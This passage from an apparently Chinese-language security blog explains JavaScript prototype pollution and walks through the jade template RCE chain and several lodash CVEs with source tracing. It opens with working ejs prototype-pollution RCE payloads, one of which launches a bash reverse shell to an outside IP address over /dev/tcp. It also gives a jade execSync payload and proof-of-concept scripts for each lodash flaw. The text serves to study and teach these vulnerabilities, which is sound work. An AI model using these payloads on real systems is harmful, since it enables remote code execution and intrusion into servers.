<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).execSync(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;calc&#x27;);var __tmp2&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/120.77.200.94/8888 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>第二个好用，上面有些都用不了。多试试！！！</p>
<h2 id="jade模板引擎RCE"><a href="#jade模板引擎RCE" class="headerlink" title="jade模板引擎RCE"></a>jade模板引擎RCE</h2><p>原型链的污染思路和 ejs 思路很像, 从 <code>require(&#39;jade&#39;).__express</code> 进入 <code>jade/lib/index.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">__express</span> = <span class="keyword">function</span>(<span class="params">path, options, fn</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(options.<span class="property">compileDebug</span> == <span class="literal">undefined</span> &amp;&amp; process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">    options.<span class="property">compileDebug</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exports</span>.<span class="title function_">renderFile</span>(path, options, fn);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进 renderFile 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exports.renderFile = function(path, options, fn)&#123;</span><br><span class="line">...</span><br><span class="line">return handleTemplateCache(options)(options);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>返回的时候进入了 handleTemplateCache 函数, 跟进</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151139300.png" alt="image-20250509151139300"></p>
<p>会进入 complie 方法, 跟进</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151155381.png" alt="image-20250509151155381"></p>
<p>jade 模板和 ejs 不同, 在compile之前会有 parse 解析, 尝试控制传入 parse 的语句</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151219036.png" alt="image-20250509151219036"></p>
<p>在 parse 函数中主要执行了这两步, 最后返回的部分</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body = <span class="string">&#x27;&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;var buf = [];\n&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;var jade_mixins = &#123;&#125;;\n&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;var jade_interp;\n&#x27;</span></span><br><span class="line">   + (options.<span class="property">self</span></span><br><span class="line">     ? <span class="string">&#x27;var self = locals || &#123;&#125;;\n&#x27;</span> + js</span><br><span class="line">     : <span class="title function_">addWith</span>(<span class="string">&#x27;locals || &#123;&#125;&#x27;</span>, <span class="string">&#x27;\n&#x27;</span> + js, globals)) + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">   + <span class="string">&#x27;return buf.join(&quot;&quot;);&#x27;</span>;</span><br><span class="line"> <span class="keyword">return</span> &#123;<span class="attr">body</span>: body, <span class="attr">dependencies</span>: parser.<span class="property">dependencies</span>&#125;;</span><br></pre></td></tr></table></figure>

<p><code>options.self</code> 可控, 可以绕过 <code>addWith</code> 函数, 回头跟进 compile 函数, 看看作用</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151251727.png" alt="image-20250509151251727"></p>
<p>返回的是 buf, 跟进 visit 函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151300177.png" alt="image-20250509151300177"></p>
<p>如果 debug 为 true, <code>node.line</code> 就会被 push 进去, 造成拼接 (两个参数)</p>
<blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jade_debug.<span class="title function_">unshift</span>(<span class="keyword">new</span> jade.<span class="title class_">DebugItem</span>( <span class="number">0</span>, <span class="string">&quot;&quot;</span> ));<span class="keyword">return</span> <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;dir&#x27;</span>);<span class="comment">//</span></span><br><span class="line"><span class="comment">// 注释符注释掉后面的语句</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>在返回的时候还会经过 visitNode 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">visitNode: function(node)&#123;</span><br><span class="line">    return this[&#x27;visit&#x27; + node.type](node);&#125;</span><br></pre></td></tr></table></figure>

<p>经过测试 visit 开头的函数, 结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">visitAttributes</span><br><span class="line">visitBlock</span><br><span class="line">visitBlockComment √</span><br><span class="line">visitCase</span><br><span class="line">visitCode √</span><br><span class="line">visitComment √</span><br><span class="line">visitDoctype √</span><br><span class="line">visitEach</span><br><span class="line">visitFilter</span><br><span class="line">visitMixin</span><br><span class="line">visitMixinBlock √</span><br><span class="line">visitNode</span><br><span class="line">visitLiteral</span><br><span class="line">visitText</span><br><span class="line">visitTag</span><br><span class="line">visitWhen</span><br></pre></td></tr></table></figure>

<p>然后就可以返回 buf 部分进行命令执行</p>
<blockquote>
<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>: &#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;self&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;0, <span class="subst">\&quot;</span><span class="subst">\&quot;</span> ));return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;dir&#x27;);//&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>补充:</strong> 针对 jade RCE链的污染, 普通的模板可以只需要污染 self 和 line, 但是有继承的模板还需要污染 type</p>
<h2 id="Lodash-模块原型链污染"><a href="#Lodash-模块原型链污染" class="headerlink" title="Lodash 模块原型链污染"></a>Lodash 模块原型链污染</h2><p>Lodash 是一个 JavaScript 库，包含简化字符串、数字、数组、函数和对象编程的工具，可以帮助程序员更有效地编写和维护 JavaScript 代码。</p>
<h3 id="lodash-defaultsDeep-方法-CVE-2019-10744"><a href="#lodash-defaultsDeep-方法-CVE-2019-10744" class="headerlink" title="lodash.defaultsDeep 方法 CVE-2019-10744"></a>lodash.defaultsDeep 方法 CVE-2019-10744</h3><p>影响了小于 4.17.12 的所有版本的 lodash。</p>
<p>Lodash 库中的 defaultsDeep 函数可能会被包含 constructor 的 Payload  诱骗添加或修改Object.prototype 。最终可能导致 Web 应用程序崩溃或改变其行为，具体取决于受影响的用例。以下是 Snyk  给出的此漏洞验证 POC：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).<span class="property">defaultsDeep</span>;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">mergeFn</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151324110.png" alt="image-20250509151324110"></p>
<p>这里我们本地调试一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224123506464.png" alt="image-20241224123506464"></p>
<p>f7跟进后</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224123554811.png" alt="image-20241224123554811"></p>
<p>注意看下面的变量，merge成功了。</p>
<p>成功在类型为 Object 的 a 对象的 <code>__proto__</code> 属性中添加了一个 <code>whoami</code> 属性，值为 <code>Vulnerable</code>，污染成功。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224123624588.png" alt="image-20241224123624588"></p>
<p>原型被污染了</p>
<p>在 lodash.merge 方法造成的原型链污染中，为了实现代码执行，我们常常会污染 <code>sourceURL</code> 属性，即给所有 Object 对象中都插入一个 <code>sourceURL</code> 属性，然后通过 lodash.template 方法中的拼接实现任意代码执行漏洞。后面会讲到。</p>
<h3 id="lodash-merge-方法造成的原型链污染CVE-2018-3721"><a href="#lodash-merge-方法造成的原型链污染CVE-2018-3721" class="headerlink" title="lodash.merge 方法造成的原型链污染CVE-2018-3721"></a>lodash.merge 方法造成的原型链污染CVE-2018-3721</h3><p>在lodash 4.17.5之前的版本中 存在这个漏洞</p>
<p>Lodash.merge 作为 lodash 中的对象合并插件，他可以<strong>递归</strong>合并 <code>sources</code> 来源对象自身和继承的可枚举属性到 <code>object</code> 目标对象，以创建父映射对象：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merge(object, sources)</span><br></pre></td></tr></table></figure>

<p>这种格式的东西在原型链污染中是出现频率很高的危险函数之一</p>
<p>这里当两个键相同的时候，生成的对象将有最右边的值，在这里也就是sources的值。当有多个对象相同的时候，那么新生成的对象将只有一个与这些对象相对应的键和值。这也就是之前在Merge类污染的时候讲过的递归那一块，其实和之前说的Merge类污染是很相似的，我们来看源码。</p>
<ul>
<li>node_modules&#x2F;lodash&#x2F;merge.js</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151455115.png" alt="image-20250509151455115"></p>
<p>直接调用了<code>baseMerge</code>方法，我们直接跟进</p>
<ul>
<li>node_modules&#x2F;lodash&#x2F;_baseMerge.js</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151512736.png"></p>
<p>这里对srcValue有一个筛选，如果他是一个对象的话就进入<code>baseMergeDeep</code>方法，我们要去Merge的对象一定是个Object</p>
<ul>
<li>node_modules&#x2F;lodash&#x2F;_baseMergeDeep.js</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151607942.png" alt="image-20250509151607942"></p>
<p>这里对于上一步的srcValue直接丢进了<code>assignMergeValue</code>中，继续跟进</p>
<ul>
<li>node_modules&#x2F;lodash&#x2F;_assignMergeValue.js：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151632417.png" alt="image-20250509151632417"></p>
<p>这里对value的值和对象键名啥的进行一个筛选，但是最终就是进入<code>baseAssignValue</code></p>
<ul>
<li>node_modules&#x2F;lodash&#x2F;_baseAssignValue.js</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151703830.png" alt="image-20250509151703830"></p>
<p>这里可以进行绕过</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">prefixPayload = &#123; <span class="attr">nickname</span>: <span class="string">&quot;Will1am&quot;</span> &#125;;</span><br><span class="line">payload：&#123;<span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;prototype&quot;</span>: &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;admin&quot;</span>&#125;&#125;&#125;</span><br><span class="line">_.<span class="title function_">merge</span>(prefixPayload, payload);</span><br></pre></td></tr></table></figure>

<p>最终进入 <code>object[key] = value</code> 的赋值操作。</p>
<p>也就是object[prototype] &#x3D; {“role”: “admin”}</p>
<p>这样就给原型对象赋值了一个名为role，值为admin的属性</p>
<p>POC：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var lodash= require(&#x27;lodash&#x27;);</span><br><span class="line">var payload = &#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:&quot;yes&quot;&#125;&#125;&#x27;;</span><br><span class="line"></span><br><span class="line">var a = &#123;&#125;;</span><br><span class="line">console.log(&quot;Before polluted: &quot; + a.polluted);</span><br><span class="line">lodash.merge(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">console.log(&quot;After polluted: &quot; + a.polluted);</span><br></pre></td></tr></table></figure>

<p>我们在 <code>lodash.merge(&#123;&#125;, JSON.parse(payload));</code> 处下断点，单步结束后可以看到：</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151759072.png" alt="image-20250509151759072"></p>
<p>成功在类型为 Object 的 a 对象的 <code>__proto__</code> 属性中添加了一个 <code>polluted</code> 属性，值为 <code>yes</code>，污染成功。</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151826000.png" alt="image-20250509151826000" style="zoom:80%;" />

<p>运行结果也表示了污染成功</p>
<h3 id="lodash-mergeWith-方法-CVE-2018-16487"><a href="#lodash-mergeWith-方法-CVE-2018-16487" class="headerlink" title="lodash.mergeWith 方法 CVE-2018-16487"></a>lodash.mergeWith 方法 CVE-2018-16487</h3><p>4.17.11之前的版本 存在这个漏洞</p>
<p>这个方法类似于 <code>merge</code> 方法。但是它还会接受一个 <code>customizer</code>，以决定如何进行合并。 如果 <code>customizer</code> 返回 <code>undefined</code> 将会由合并处理方法代替。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mergeWith(object, sources, [customizer])</span><br></pre></td></tr></table></figure>

<p>这个方法在4.0.0版本之后添加的</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151851505.png" alt="image-20250509151851505"></p>
<h3 id="lodash-set-方法-以及-setWith-方法-CWE-400"><a href="#lodash-set-方法-以及-setWith-方法-CWE-400" class="headerlink" title="lodash.set 方法 以及 setWith 方法 CWE-400"></a>lodash.set 方法 以及 setWith 方法 <code>CWE-400</code></h3><p>设置<code>object</code>对象中对应 path 属性路径上的值，如果path不存在，则创建。 缺少的索引属性会创建为数组，<strong>而缺少的属性会创建为对象</strong>。 使用**_.setWith** 定制path创建。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set(object, path, value)</span><br></pre></td></tr></table></figure>

<ol>
<li>object (Object): 要修改的对象。</li>
<li>path (Array|string): 要设置的对象路径。</li>
<li>value (*): 要设置的值。</li>
</ol>
<p>返回(Object): 返回 object。</p>
<p>漏洞验证poc：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_1 = &#123; <span class="string">&#x27;a&#x27;</span>: [&#123; <span class="string">&#x27;b&#x27;</span>: &#123; <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span> &#125; &#125;] &#125;;</span><br><span class="line"><span class="keyword">var</span> object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br><span class="line">lodash.<span class="title function_">set</span>(object_2, <span class="string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="string">&#x27;Vulnerable&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224135710297.png" alt="image-20241224135710297"></p>
<p>还有一个setWith，与上面的类似</p>
<p>但是还回接受一个<code>customizer</code>，用来调用并决定如何设置对象路径的值。 如果 <code>customizer</code> 返回 <code>undefined</code> 将会有它的处理方法代替。<code>customizer</code> 调用3个参数：  <em>(nsValue, key, nsObject)</em> 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509151924704.png" alt="image-20250509151924704"></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_1 = &#123; <span class="string">&#x27;a&#x27;</span>: [&#123; <span class="string">&#x27;b&#x27;</span>: &#123; <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span> &#125; &#125;] &#125;;</span><br><span class="line"><span class="keyword">var</span> object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br><span class="line"><span class="comment">//lodash.setWith(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span></span><br><span class="line">lodash.<span class="title function_">setWith</span>(object_2, <span class="string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="string">&#x27;Vulnerable&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224140006500.png" alt="image-20241224140006500"></p>
<h3 id="lodash-zipObjectDeep-方法-CVE-2020-8203"><a href="#lodash-zipObjectDeep-方法-CVE-2020-8203" class="headerlink" title="lodash.zipObjectDeep 方法 CVE-2020-8203"></a>lodash.zipObjectDeep 方法 CVE-2020-8203</h3><p>影响版本 &lt; 4.17.20</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152006698.png" alt="image-20250509152006698" style="zoom:80%;" />

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> _ = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line">_.<span class="title function_">zipObjectDeep</span>([<span class="string">&#x27;__proto__.z&#x27;</span>],[<span class="number">123</span>])</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(z) <span class="comment">// 123</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20241224140456429.png" alt="image-20241224140456429"></p>
<p>接下来跟一下源码：</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152032061.png" alt="image-20250509152032061" style="zoom:80%;" />



<p>跟进一下baseZipObject函数</p>
<img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250509152056379.png" alt="image-20250509152056379" style="zoom:80%;" />

<p>POC中调用baseZipObject函数时，length等于1，varsLength等于1，assignFunc是baseSet。</p>
<p>因此执行的其实是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">baseSet(&#123;&#125;, &#x27;__proto__.z&#x27;, 123)</span><br></pre></td></tr></table></figure>

<p>跟进baseSet函数</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> assignValue = <span class="built_in">require</span>(<span class="string">&#x27;./_assignValue&#x27;</span>),</span><br><span class="line">    castPath = <span class="built_in">require</span>(<span class="string">&#x27;./_castPath&#x27;</span>),</span><br><span class="line">    isIndex = <span class="built_in">require</span>(<span class="string">&#x27;./_isIndex&#x27;</span>),</span><br><span class="line">    isObject = <span class="built_in">require</span>(<span class="string">&#x27;./isObject&#x27;</span>),</span><br><span class="line">    toKey = <span class="built_in">require</span>(<span class="string">&#x27;./_toKey&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base implementation of `_.set`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@private</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; object The object to modify.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Array|string</span>&#125; path The path of the property to set.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">*</span>&#125; value The value to set.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Function</span>&#125; [customizer] The function to customize path creation.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@returns</span> &#123;<span class="type">Object</span>&#125; Returns `object`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">baseSet</span>(<span class="params">object, path, value, customizer</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_">isObject</span>(object)) &#123;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">  &#125;</span><br><span class="line">  path = <span class="title function_">castPath</span>(path, object);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> index = -<span class="number">1</span>,</span><br><span class="line">      length = path.<span class="property">length</span>,</span><br><span class="line">      lastIndex = length - <span class="number">1</span>,</span><br><span class="line">      nested = object;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (nested != <span class="literal">null</span> &amp;&amp; ++index &lt; length) &#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="title function_">toKey</span>(path[index]),</span><br><span class="line">        newValue = value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index != lastIndex) &#123;</span><br><span class="line">      <span class="keyword">var</span> objValue = nested[key];</span><br><span class="line">      newValue = customizer ? <span class="title function_">customizer</span>(objValue, key, nested) : <span class="literal">undefined</span>;</span><br><span class="line">      <span class="keyword">if</span> (newValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        newValue = <span class="title function_">isObject</span>(objValue)</span><br><span class="line">          ? objValue</span><br><span class="line">          : (<span class="title function_">isIndex</span>(path[index + <span class="number">1</span>]) ? [] : &#123;&#125;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">assignValue</span>(nested, key, newValue);</span><br><span class="line">    nested = nested[key];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = baseSet;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里用到castPath将路径<code>__proto__.z</code>解析成属性数组<code>[&#39;__proto__&#39;,&#39;z&#39;]</code></p>
<p>然后就进入了while循环，大概执行了以下操作：</p>
<p>按属性数组中元素的顺序，依次获取对象原有的属性值，并进行赋值；</p>
<p>如果该属性不是数组的最后一个元素，那赋值为对象本身，或空数组，或{}。</p>
<p>如果是数组的最后一个元素，就将该属性赋值为我们期望的value。</p>
<h3 id="配合-lodash-template-实现-RCE"><a href="#配合-lodash-template-实现-RCE" class="headerlink" title="配合 lodash.template 实现 RCE"></a>配合 lodash.template 实现 RCE</h3><p>Lodash.template 是 Lodash 中的一个简单的模板引擎，<strong>创建一个预编译模板方法，可以插入数据到模板中 “interpolate” 分隔符相应的位置。</strong> HTML会在 “escape” 分隔符中转换为相应实体。 在 “evaluate” 分隔符中允许执行JavaScript代码。 在模板中<strong>可以自由访问变量</strong>。 如果设置了选项对象，则会优先覆盖 <code>_.templateSettings</code> 的值。</p>
<p>在 Lodash 的原型链污染中，为了实现代码执行，我们常常会污染 template 中的 sourceURL 属性</p>
<p>我们看一下相关的源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a sourceURL for easier debugging.</span></span><br><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">&#x27;sourceURL&#x27;</span> <span class="keyword">in</span> options ? <span class="string">&#x27;//# sourceURL=&#x27;</span> + options.<span class="property">sourceURL</span> + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">var</span> result = <span class="title function_">attempt</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Function</span>(importsKeys, sourceURL + <span class="string">&#x27;return &#x27;</span> + source)</span><br><span class="line">  .<span class="title function_">apply</span>(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

